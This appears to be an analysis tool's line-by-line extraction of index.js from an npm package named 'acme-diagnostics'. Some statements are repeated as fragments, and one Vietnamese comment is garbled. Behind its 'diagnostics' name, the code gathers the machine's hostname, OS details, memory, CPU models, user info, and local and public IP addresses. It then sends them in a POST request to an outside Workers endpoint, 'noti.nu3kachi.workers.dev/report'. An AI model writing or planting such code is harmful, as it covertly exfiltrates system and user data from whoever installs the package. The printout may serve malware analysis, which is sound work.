// File: tmp/tmpdqof3m_y/acme-diagnostics/package/index.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const https = require('https')
Line 4: {
  const interfaces = os.networkInterfaces();
  const localIPs = [];
  for (const name of Object.keys(interfaces)) {
    for (const net of interfaces[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        localIPs.push(net.address);
      }
    }
  }

  const publicIP = await new Promise((resolve) => {
    https.get('https://api.ipify.org?format=json', (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data).ip || 'unknown');
        } catch {
          resolve('unknown');
        }
      });
    }).on('error', () => resolve('unknown'));
  });

  const payloadObj = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    type: os.type(),
    release: os.release(),
    endianness: os.endianness(),
    uptime: os.uptime(),
    totalmem: os.totalmem(),
    freemem: os.freemem(),
    cpus: os.cpus().map(cpu => cpu.model).slice(0, 2), // Láº¥y 2 core ...
Line 6: const localIPs = []
Line 7: for (const name of Object.keys(interfaces)) {
    for (const net of interfaces[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        localIPs.push(net.address);
      }
    }
  }
Line 8: for (const net of interfaces[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        localIPs.push(net.address);
      }
    }
Line 10: localIPs.push(net.address)
Line 15: const publicIP = await new Promise((resolve) => {
    https.get('https://api.ipify.org?format=json', (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data).ip || 'unknown');
        } catch {
          resolve('unknown');
        }
      });
    }).on('error', () => resolve('unknown'));
  })
Line 16: (_tmp_1 = https.get('https://api.ipify.org?format=json', (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data).ip || 'unknown');
        } catch {
          resolve('unknown');
        }
      });
    }))
Line 30: os.hostname()
Line 31: os.platform()
Line 32: os.arch()
Line 33: os.type()
Line 37: os.totalmem()
Line 39: os.cpus()
Line 40: os.userInfo()
Line 52: const req = https.request({
    hostname: 'noti.nu3kachi.workers.dev',
    port: 443,
    path: '/report',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  }, res => {})
Line 64: req.setTimeout(5000, () => req.abort())
Line 65: req.write(payload)
Line 66: req.end()
